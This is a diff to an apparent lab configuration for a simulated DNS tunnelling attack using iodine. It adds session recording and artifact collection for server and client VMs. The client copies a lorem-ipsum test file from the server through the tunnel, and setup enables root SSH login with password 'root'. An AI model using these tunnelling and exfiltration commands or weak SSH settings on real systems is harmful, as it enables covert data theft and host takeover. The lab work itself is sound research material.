@@ -1,31 +1,41 @@
 dns_attack_server:
     name: iodine_server
     image: ubuntu/focal64
+    ipv4_address: 192.168.0.20
     description: |
       This sets up the IODINE server.
     setup:
         type: shell
         val: |-
-          echo "Installing IODINE"; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass; cd /opt; git clone https://github.com/yarrick/iodine.git; cd /opt/iodine; make; make install; echo "Setup SSH Daemon"; mkdir -p /var/run/sshd; echo "root:root" | chpasswd; sed -ri "s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/" /etc/ssh/sshd_config; sed -ri "s/UsePAM yes/#UsePAM yes/g" /etc/ssh/sshd_config; mkdir /root/.ssh; echo "Setting up testfile"; cd /root; lorem -p 10000 > test-file
+          echo "Installing IODINE"; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass asciinema; cd /opt; git clone https://github.com/yarrick/iodine.git; cd /opt/iodine; make; make install; echo "Setup SSH Daemon"; mkdir -p /var/run/sshd; echo "root:root" | chpasswd; sed -ri "s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/" /etc/ssh/sshd_config; sed -ri "s/UsePAM yes/#UsePAM yes/g" /etc/ssh/sshd_config; sed -ri "s/PasswordAuthentication no/PasswordAuthentication yes/g" /etc/ssh/sshd_config; mkdir /root/.ssh; echo "Setting up testfile"; cd /root; lorem -p 10000 > test-file
     run:
         type: shell
         val: |-
-          /usr/sbin/sshd -D; iodined -4 -c -f 10.0.0.1 example.attack -P {{ variables.passphrase }} &
+          nohup asciinema rec /tmp/iodine_server_{{ variables.record_type }}_{{ variables.encoding }}_{{ variables.passphrase }}.cast -c \'iodined -4 -c -f 10.0.0.1 example.attack -P {{ variables.passphrase }} & sleep 1\'
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
 
 dns_attack_client:
     name: iodine_client
     image: ubuntu/focal64
+    ipv4_address: 192.168.0.30
     description: |
       This sets up the IODINE client.
     setup:
       type: shell
       val: |-
-        echo "Installing IODINE"; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass; cd /opt; git clone https://github.com/yarrick/iodine.git; cd /opt/iodine; make; make install
+        echo "Installing IODINE"; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass asciinema; cd /opt; git clone https://github.com/yarrick/iodine.git; cd /opt/iodine; make; make install
     run:
         type: shell
         val: |-
-          iodine -4 -f -P {{ variables.passphrase }} -T{{ variables.record_type }} -O{{ variables.encoding }} -r 10.0.2.15 example.attack; sshpass -p "root" scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
+          (iodine -4 -f -P {{ variables.passphrase }} -T{{ variables.record_type }} -O{{ variables.encoding }} -r 192.168.0.10 example.attack) & sleep 20; sshpass -p "root" scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/
 
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+      - type: cli_recording
+        val: ["/tmp/iodine_client_{{ variables.record_type }}_{{ variables.encoding }}_{{ variables.passphrase }}.cast"]
     #setup:
     #    type: ansible
     #    val: 'playbook.yaml'
